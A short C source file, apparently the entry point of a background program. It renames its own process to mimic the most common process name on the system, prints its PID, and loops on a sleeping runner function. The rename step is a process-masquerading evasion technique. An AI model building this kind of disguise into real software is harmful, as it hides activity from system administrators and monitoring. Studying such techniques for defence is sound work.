#include "runner.h"
#include "proc_change.h"

#include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
	if (rename_to_most_common_process(argc, argv) != 0) {
		printf("Rename failed\n");
		return -1;
	}

	// ps -p 14328 -o pid,comm,args
	printf("PID: %d\n", getpid());

    struct Context ctx = {0};

	while(runner(&ctx) == 1){
		printf("Runner going back to sleep\n");
	}

    return 0;
}
